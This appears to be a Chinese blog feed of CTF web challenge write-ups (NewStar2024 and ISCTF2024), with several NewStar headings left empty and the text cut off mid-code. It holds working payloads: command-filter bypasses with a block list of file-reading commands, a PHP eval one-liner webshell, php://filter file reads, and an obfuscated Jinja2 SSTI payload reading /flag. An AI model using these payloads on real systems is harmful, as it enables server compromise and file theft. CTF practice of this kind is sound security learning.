    <link href="/2025/05/23/NewStar2024-web/"/>
    <url>/2025/05/23/NewStar2024-web/</url>
    
    <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="PangBai过家家（1）"><a href="#PangBai过家家（1）" class="headerlink" title="PangBai过家家（1）"></a>PangBai过家家（1）</h3><p>level1</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_1.png"></p><p>访问&#x2F;3578272f-18fd-432c-915e-df41579719a2路由</p><p>level2：get传ask&#x3D;miao</p><p>level3：post传say&#x3D;hello</p><p>level4：ua头的浏览器引擎改为Papa，post传say&#x3D;玛卡巴卡阿卡哇卡米卡玛卡呣</p><p>level5：用PATCH方法上传一个zip文件，bp抓个包，然后去修改请求包，主要修改部分如下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">PATCH<span class="hljs-comment">#将请求方法改为PATCH</span><br><br><span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span>fileupload<span class="hljs-comment">#将请求体的数据类型改为了多部分数据，并加了一个字段间的分隔符</span><br><br><span class="hljs-operator">-</span>-fileupload<span class="hljs-comment">#上传say=玛卡巴卡阿卡哇卡米卡玛卡呣</span><br><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;say&quot;</span><br><br>玛卡巴卡阿卡哇卡米卡玛卡呣<br><span class="hljs-operator">-</span>-fileupload<span class="hljs-comment">#上传zip文件</span><br><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;patch.zip&quot;</span><br><br><span class="hljs-number">123</span><br><span class="hljs-operator">-</span>-fileupload--<br></code></pre></td></tr></table></figure><p>boundary(字段分隔符)是一个唯一字符，正文的每一部分用–boundary开头，用–boundary–结尾</p><p>bp输入中文只需将需要输入的中文保存为一个文件，然后在输入位置右键选择从文件中粘贴即可</p><p>得到一个token</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_2.png"></p><p>将cookie中的token替换为新得到的token，进入第六关</p><p>第六关：加一个xff头“X-Forwarded-For: 127.0.0.1”</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_3.png"></p><p>有jwt加一个字符串，猜测是进行jwt伪造，改为第0关</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_4.png"></p><p>替换token后，看一段动画flag就出来了</p><h3 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h3><p>flag在响应头</p><p><img src="/2025/05/23/NewStar2024-web/headach3.png"></p><h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h3><p>第一关：ctrl+u查看页面源码（flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:&#x2F;4cqu1siti0n）</p><p>第二关：看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">revealFlag</span>(<span class="hljs-params">className</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/flag/<span class="hljs-subst">$&#123;className&#125;</span>`</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                    &#125;<br>                &#125;);<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`恭喜你！你获得了第二部分的 flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="hljs-subst">$&#123;data.nextLevel&#125;</span>`</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求失败，请检查输入或服务器响应。&#x27;</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 控制台提示</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);<br></code></pre></td></tr></table></figure><p>传入正确的className即可，用提示className为4cqu1siti0n，控制台revealFlag(‘4cqu1siti0n’)</p><p>(恭喜你！你获得了第二部分的 flag: IV95NF9yM2Fs …… 时光荏苒，你成长了很多，也发生了一些事情。去看看吧：&#x2F;s34l)</p><p>第三关：看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;seal_him&#x27;</span>);<br>    <span class="hljs-keyword">const</span> stateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>);<br>    <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;message&#x27;</span>);<br><br>    form.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br>        event.<span class="hljs-title function_">preventDefault</span>();<br><br>  <br>        <span class="hljs-keyword">if</span> (stateElement.<span class="hljs-property">textContent</span>.<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">&#x27;解封&#x27;</span>) &#123;<br>            messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;如何是好？&#x27;</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                &#125;,<br>                <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span> &#125;)<br>            &#125;);<br><br>            <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`第三部分Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;无&#x27;</span>&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败，请重试。&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;);<br>    <br></code></pre></td></tr></table></figure><p>控制台document.getElementById(‘state’).textContent &#x3D; ‘解封’;</p><p>（第三部分Flag: MXlfR3I0c1B, 你解救了五条悟！下一关: &#x2F;Ap3x）</p><p>第四关：前端js限制了表单的默认提交行为，直接通过控制台（或禁用js）</p><blockquote><p>fetch(“&#x2F;api&#x2F;flag&#x2F;Ap3x”, {<br>    method: “POST”,<br>    headers: {<br>        “Content-Type”: “application&#x2F;x-www-form-urlencoded”<br>    },<br>    body: “csrf_token&#x3D;hfaousghashgfasbasiouwrda1_”<br>}).then(r &#x3D;&gt; r.text()).then(console.log);</p></blockquote><p>（{“flag”:”fSkpKcyF9”,”nextLevel”:null}）</p><blockquote><p>完整flag：ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</p><p>base64解码：flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</p></blockquote><h3 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h3><h3 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h3><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="PangBai过家家（2）"><a href="#PangBai过家家（2）" class="headerlink" title="PangBai过家家（2）"></a>PangBai过家家（2）</h3><h3 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h3><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><h3 id="谢谢皮蛋plus"><a href="#谢谢皮蛋plus" class="headerlink" title="谢谢皮蛋plus"></a>谢谢皮蛋plus</h3><h3 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h3><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Include-Me"><a href="#Include-Me" class="headerlink" title="Include Me"></a>Include Me</h3><h3 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h3><h3 id="臭皮踩踩背"><a href="#臭皮踩踩背" class="headerlink" title="臭皮踩踩背"></a>臭皮踩踩背</h3><h3 id="这「照片」是你吗"><a href="#这「照片」是你吗" class="headerlink" title="这「照片」是你吗"></a>这「照片」是你吗</h3><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="Pangbai-过家家（4）"><a href="#Pangbai-过家家（4）" class="headerlink" title="Pangbai 过家家（4）"></a>Pangbai 过家家（4）</h3><h3 id="blindsql2"><a href="#blindsql2" class="headerlink" title="blindsql2"></a>blindsql2</h3><h3 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h3><h3 id="ezcmsss"><a href="#ezcmsss" class="headerlink" title="ezcmsss"></a>ezcmsss</h3><h3 id="ezpollute"><a href="#ezpollute" class="headerlink" title="ezpollute"></a>ezpollute</h3><h3 id="隐藏的密码"><a href="#隐藏的密码" class="headerlink" title="隐藏的密码"></a>隐藏的密码</h3><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="PangBai-过家家（5）"><a href="#PangBai-过家家（5）" class="headerlink" title="PangBai 过家家（5）"></a>PangBai 过家家（5）</h3><h3 id="ez-redis"><a href="#ez-redis" class="headerlink" title="ez_redis"></a>ez_redis</h3><h3 id="sqlshell"><a href="#sqlshell" class="headerlink" title="sqlshell"></a>sqlshell</h3><h3 id="臭皮吹泡泡"><a href="#臭皮吹泡泡" class="headerlink" title="臭皮吹泡泡"></a>臭皮吹泡泡</h3><h3 id="臭皮的网站"><a href="#臭皮的网站" class="headerlink" title="臭皮的网站"></a>臭皮的网站</h3>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF2024_WEB复现</title>
    <link href="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br><span class="hljs-comment">#一句话木马，神神又奇奇</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$call</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>    <span class="hljs-variable">$dangerous_commands</span> = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;tac&#x27;</span>, <span class="hljs-string">&#x27;head&#x27;</span>, <span class="hljs-string">&#x27;nl&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;less&#x27;</span>, <span class="hljs-string">&#x27;tail&#x27;</span>, <span class="hljs-string">&#x27;vi&#x27;</span>, <span class="hljs-string">&#x27;sed&#x27;</span>, <span class="hljs-string">&#x27;od&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$command</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$command</span>/i&quot;</span>, <span class="hljs-variable">$call</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这些个危险函数可不兴使啊&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$call</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>题目过滤了一些读文件的命令</p><p>先ls &#x2F;，发现&#x2F;f14g目录</p><p>拿flag的话，这里就直接贴一些payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">J=ca&#x27;&#x27;t /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=strings /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=tar -czf flag.tar.gz /f14g# 将/f14g文件打包为flag.tar.gz文件，访问下载即可</span><br><span class="language-xml"></span><br><span class="language-xml">J=cp /f14g flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">J=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; 1.php# 题目提示的写马</span><br><span class="language-xml"></span><br><span class="language-xml">······</span><br></code></pre></td></tr></table></figure><h2 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会"></a>25时晓山瑞希生日会</h2><p>bp抓包</p><p>1、“你不是烤p！要是Project Sekai的客户端请求才能加入生日会” &#x3D;&#x3D;&gt; 把ua头改为“Project Sekai”</p><p>2、“只能从本地来！” &#x3D;&#x3D;&gt; 加一个xff头“X-Forwarded-For: 127.0.0.1”</p><p>3、“你似乎没在正确的时间来…”</p><p>加一个Date头，先随便加一个时间，提示“日期格式不对哦，要RFC 822格式”</p><blockquote><p>RFC 822格式时间是一种标志化的时间表示方法，常用于电子邮件和互联网协议中，它的格式为：Day, DD Mon YYYY HH:MM:SS GMT，例如：Mon, 30 Nov 2020 01:07:30 GMT</p></blockquote><p>按照格式修改Date头的值，提示太早了</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/251.png"></p><p>检索一下“25时晓山瑞希生日会”，发现时间“2024年8月27日”，修改Date头，拿到flag</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/252.png"></p><h2 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader"></a>UP!UPloader</h2><p>先随便传一个文件，提示include.php</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/up1.png"></p><p>访问include.php，提示文件包含，尝试用伪协议读出upload.php</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</p></blockquote><p>解码后，得到upload.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_FILENAME);<br>    <span class="hljs-variable">$dir_name</span> = <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-variable">$upload_dir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$upload_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$upload_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$upload_dir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$dir_name</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！不过文件路径可不好找呀~什么？什么include.php？我不知道啊。&quot;</span> ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储失败，未知原因......&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件上传后被放在&#x2F;uploads目录下，且文件被保存为md5(原文件名.拓展名)+拓展名</p><p>上传1.php，其中写入一句话木马，上传后1.php被保存为f3b94e88bd1bd325af6f62828c8785dd.php，然后连马，拿flag，flag在环境变量中</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Blocked by security filter!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了一些命令和函数，直接贴一些payload吧</p><blockquote><p>cmd&#x3D;passthru(‘ca\t${IFS}&#x2F;f*’);</p><p>cmd&#x3D;passthru(‘strings${IFS}&#x2F;f*’);</p><p>cmd&#x3D;include$_GET[‘a’];&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag</p><p>cmd&#x3D;(sy.(st).em)(hex2bin(‘636174202f662a’));</p><p>······</p></blockquote><h2 id="ezSSTI"><a href="#ezSSTI" class="headerlink" title="ezSSTI"></a>ezSSTI</h2><p>fenjing一把梭</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/ezssti.png"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0062</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0062</span><span class="hljs-character">\u0075</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006e</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0076</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u006c</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0072</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0029</span><span class="hljs-character">\u002e</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006e</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0063</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0020</span><span class="hljs-character">\u002f</span><span class="hljs-character">\u0066</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0029</span><span class="hljs-character">\u002e</span><span class="hljs-character">\u0072</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0064</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0029</span>&#x27;))%&#125;<br></code></pre></td></tr></table></figure><h2 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize"></a>ezserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 